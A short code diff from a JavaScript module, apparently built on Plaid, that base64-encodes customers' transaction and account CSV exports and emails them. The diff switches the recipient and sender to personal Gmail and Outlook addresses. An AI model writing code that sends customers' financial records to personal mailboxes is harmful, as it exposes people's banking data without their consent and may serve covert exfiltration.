@@ -112,8 +112,8 @@ const getAccountInfoModule = async function() {
   let base64data1 = Buffer.from(csvTransactions).toString('base64');
   let base64data2 = Buffer.from(csvAccounts).toString('base64');
   const msg = {
-    to: 'goldbyol@outlook.com',
-    from: 'amacool0117@gmail.com',
+    to: 'goldbyol725@gmail.com',
+    from: 'goldbyol@outlook.com',
     subject: 'Plaid Account Information',
     text: 'This is Plaid account information of your customer.',
     html: '<strong>customer account & transaction information</strong>',
